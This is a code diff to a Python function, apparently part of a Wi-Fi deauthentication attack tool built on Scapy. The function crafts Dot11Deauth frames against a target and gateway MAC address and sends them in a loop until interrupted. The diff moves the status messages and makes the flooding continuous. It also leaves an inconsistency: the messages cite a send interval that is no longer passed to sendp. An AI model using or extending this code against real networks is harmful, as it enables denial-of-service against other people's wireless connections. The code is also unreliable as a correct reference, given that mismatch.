@@ -8,7 +8,7 @@ def deauth(target_mac, gateway_mac, iface):
     # addr1: destination MAC
     # addr2: source MAC
     # addr3: Access Point MAC
-    loop=1
+
     count=0
     inter=0.00001
 
@@ -35,10 +35,15 @@ def deauth(target_mac, gateway_mac, iface):
 
         if choice.lower() == 'y':
 
+            if count:
+                print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending {count} frames every {inter}s...")
+            else:
+                print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending frames every {inter}s until CTRL-C is pressed...")
+
             # Stack them up
             packet = RadioTap()/dot11/Dot11Deauth(reason=7)
             # Send the packet
-            sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
+            sendp(packet, count=count, loop=1, iface=iface, verbose=0)
         
         else:
             print('Operation was cancelled.')
@@ -48,11 +53,6 @@ def deauth(target_mac, gateway_mac, iface):
         print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
     except KeyboardInterrupt:
         sys.exit()
-    else:
-        # Print  info messages
-        if verbose:
-            if count:
-                print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending {count} frames every {inter}s...")
-            else:
-                print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending frames every {inter}s until CTRL-C is pressed...")
+
+            
 
